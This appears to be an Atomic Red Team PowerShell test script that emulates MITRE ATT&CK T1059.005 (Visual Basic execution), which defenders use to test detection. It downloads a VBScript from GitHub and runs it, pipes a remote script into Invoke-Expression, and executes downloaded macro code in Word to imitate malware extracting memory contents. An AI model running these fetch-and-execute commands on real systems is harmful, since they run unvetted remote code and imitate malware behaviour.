[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Visual Basic execution test, execute vbscript via PowerShell.
# When successful, system information will be written to $env:TEMP\T1059.005.out.txt.
New-Item -ItemType Directory (Split-Path $env:TEMP\sys_info.vbs) -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs" -OutFile "$env:TEMP\sys_info.vbs"
cscript $env:TEMP\sys_info.vbs > $env:TEMP\T1059.005.out.txt

# emulate malware authors utilizing well known techniques to extract data from memory/binary files. 
# To do this we first create a string in memory then pull out the pointer to that string. 
# Finally, it uses this pointer to copy the contents of that memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/T1059_005-macrocode.txt" -OutFile "$env:TEMP\T1059_005-macrocode.txt" 
Invoke-Maldoc -macroFile "$env:TEMP\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"